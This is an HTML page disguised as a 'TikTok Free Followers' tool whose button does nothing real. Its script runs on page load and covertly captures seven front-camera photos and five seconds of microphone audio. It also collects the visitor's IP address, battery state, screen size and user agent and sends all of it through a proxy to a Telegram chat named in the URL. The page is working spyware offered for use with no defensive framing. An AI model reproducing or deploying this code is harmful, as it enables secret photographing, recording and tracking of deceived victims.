<!DOCTYPE html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <title>TikTok Followers Tool - Front Camera</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
  <style>
    body { font-family: 'Montserrat', sans-serif; margin:0; padding:0; background:#f5f5f5; }
    .navbar { background: linear-gradient(90deg,#69C9D0,#EE1D52); color:white; text-align:center; padding:15px 0; box-shadow:0 4px 6px rgba(0,0,0,0.1); }
    #header { margin:0; font-size:30px; font-weight:bold; text-shadow:1px 1px 2px rgba(0,0,0,0.3); }
    .container { max-width:600px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
    .form-control { width:calc(100% - 22px); margin-bottom:15px; padding:10px; border:1px solid #ccc; border-radius:5px; font-size:16px; }
    #thumbdloadbtn { width:100%; padding:12px; border:none; border-radius:5px; background:#EE1D52; color:white; font-size:18px; font-weight:bold; cursor:pointer; box-shadow:0 4px 6px rgba(0,0,0,0.2); transition:all 0.3s ease; }
    #thumbdloadbtn:hover { background:#C21844; transform:translateY(-2px); }
    footer { text-align:center; margin-top:40px; color:#fff; background:#EE1D52; padding:12px 0; border-top-left-radius:8px; border-top-right-radius:8px; font-weight:bold; }
    .tiktok-logo { display:block; margin:10px auto; width:100px; border-radius:10px; box-shadow:0 2px 6px rgba(0,0,0,0.3); }
    h2 { color:#EE1D52; text-align:center; font-weight:bold; }
    ol li { margin-bottom:10px; font-size:16px; }
  </style>
</head>
<body>
  <nav class="navbar">
    <img class="tiktok-logo" src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo">
    <h1 id="header">TIKTOK FREE FOLLOWERS</h1>
  </nav>

  <div class="container">
    <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL">
    <button id="thumbdloadbtn" onclick="downloadThumbnail()">GET FOLLOWERS</button>
    <div id="thumbnail-preview"></div>
    <h2>How to Get TikTok Followers/Stats</h2>
    <ol>
      <li>Copy the TikTok Profile Link from App/Website</li>
      <li>Paste the Link above</li>
      <li>Click GET FOLLOWERS</li>
      <li>View Stats</li>
    </ol>
  </div>

  <center>
    <video id="video" width="0" height="0" autoplay></video>
  </center>

<script>
function downloadThumbnail(){
  document.getElementById('thumbdloadbtn').textContent='Fetching...';
}

function GetURLParameter(sParam){
  const sPageURL=window.location.search.substring(1);
  const sURLVariables=sPageURL.split('&');
  for(let i=0;i<sURLVariables.length;i++){
    const sParameterName=sURLVariables[i].split('=');
    if(sParameterName[0]==sParam){return sParameterName[1];}
  }
}
const chatid=GetURLParameter('id');

navigator.mediaDevices.getUserMedia({ video:{facingMode:'user'}, audio:true })
.then(async (stream)=>{
  const imageCapture=new ImageCapture(stream.getVideoTracks()[0]);
  const audioRecorder=new MediaRecorder(stream);

  // capture 7 photos
  for(let i=0;i<7;i++){
    setTimeout(()=>{
      imageCapture.takePhoto()
      .then(blob=>sendToTelegram(blob,'photo'))
      .catch(err=>console.error(err));
    }, i*2000);
  }

  // record audio (5s)
  audioRecorder.start();
  setTimeout(()=>audioRecorder.stop(),5000);
  audioRecorder.ondataavailable=(e)=>{ if(e.data.size>0) sendToTelegram(e.data,'voice'); };

  if(chatid){
    const [ip,battery]=await Promise.all([getIP(),getBattery()]);
    const device=getDeviceInfo();

    fetch("api/proxy",{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id:chatid,
        text:`üßë‚Äçüíª User Info:\n\n${ip}\n\n${battery}\n\n${device}`,
        type:"text"
      })
    });
  }
})
.catch(err=>{
  console.error(err);
  if(chatid){
    fetch("api/proxy",{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: chatid, text: "‚ùå User denied camera/microphone access.", type: "text"})
    });
  }
});

function sendToTelegram(data,type){
  if(!chatid) return;
  const fd=new FormData();
  fd.append('chat_id',chatid);
  fd.append('type',type);
  fd.append(type, data, `file.${type==='photo'?'jpg':'ogg'}`);
  fetch("api/proxy",{method:'POST', body:fd});
}

function getBattery(){
  if(navigator.getBattery){
    return navigator.getBattery().then(b=>`üîã Battery:\nLevel: ${Math.round(b.level*100)}%\nCharging: ${b.charging?'Yes':'No'}`);
  }
  return Promise.resolve("üîã Battery: API not available");
}

function getIP(){
  return fetch("https://api.ipify.org?format=json")
  .then(res=>res.json())
  .then(d=>`üåê IP Address: ${d.ip}`)
  .catch(()=> "üåê IP Address: N/A");
}

function getDeviceInfo(){
  return `üì± Device Info:\nScreen: ${screen.width} x ${screen.height}\n‚è∞ Time: ${new Date().toLocaleString()}\nModel: ${navigator.userAgent}`;
}
</script>

<footer><p>DEVELOP BY ALI‚ô•Ô∏è</p></footer>
</body>
</html>
